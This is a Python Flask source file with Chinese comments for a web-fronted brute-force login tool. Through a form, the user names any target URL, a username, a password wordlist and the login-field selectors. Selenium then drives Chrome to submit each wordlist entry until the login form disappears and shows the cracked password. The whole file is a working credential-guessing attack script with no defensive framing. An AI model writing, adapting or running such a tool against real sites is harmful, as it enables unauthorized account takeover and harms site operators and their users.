from flask import Flask, render_template, request, send_from_directory
from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import colorama
import os

app = Flask(__name__, template_folder='.')

colorama.init()
curr_dir = os.getcwd()
filename = 'index.html'
password = ''
errormessage = '无法找到密码'

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        usr_send_key = request.form['usr_send_key']
        file_path = request.form['file_path']
        usr_css_selector = request.form['usr_css_selector']
        pwd_css_selector = request.form['pwd_css_selector']
        submit_css_selector = request.form['submit_css_selector']
        
        findp = False
        # 运行Selenium代码
        wd = webdriver.Chrome()
        wd.get(url)
        time.sleep(3)
        
        with open(file_path) as f:
            for i in f.readlines():
                try:
                    time.sleep(1) #等待结果
                    usr = wd.find_element(By.CSS_SELECTOR,usr_css_selector)
                    usr.send_keys(usr_send_key)
                    pwd = wd.find_element(By.CSS_SELECTOR,pwd_css_selector)
                    pwd.send_keys(i.strip('\n'))
                    submit = wd.find_element(By.CSS_SELECTOR,submit_css_selector)
                    submit.click()
                    print('[*] ' + i.strip('\n'))
                    password = i.strip('\n')
                    time.sleep(1) #等待结果
                    if(wd.find_element(By.CSS_SELECTOR,submit_css_selector)):
                        usr.clear()
                        pwd.clear()
                except Exception as e:
                    time.sleep(3)
                    if 'Unable to locate element' in str(e) or 'stale element reference' in str(e):
                        time.sleep(3)
                        print(colorama.Fore.GREEN + '[+] ' + password + ' is true!' + colorama.Style.RESET_ALL)
                        findp = True
                        break
                    elif 'element click intercepted' in str(e):
                        if findp:
                            break
                        else:
                            print(colorama.Fore.RED + '[!] poor network connection' + colorama.Style.RESET_ALL)
                            print(colorama.Fore.RED + '[!] 连接似乎不太稳定，请稍等，如果是通过全局代理访问建议切换代理或延长等待结果时间' + colorama.Style.RESET_ALL)
                            wd.refresh()
                            continue
                    else:
                        print(e)
                    break
            if findp:
                result = {'url': url, 'username': usr_send_key, 'password': password}
                return render_template('result.html', result=result)
            else:
                result = {'url': url, 'username': usr_send_key, 'password': errormessage}
                return render_template('result.html', result=result)
    else:
        return send_from_directory(directory=curr_dir, path=filename)


if __name__ == '__main__':
    app.run(debug=True, port=8019)
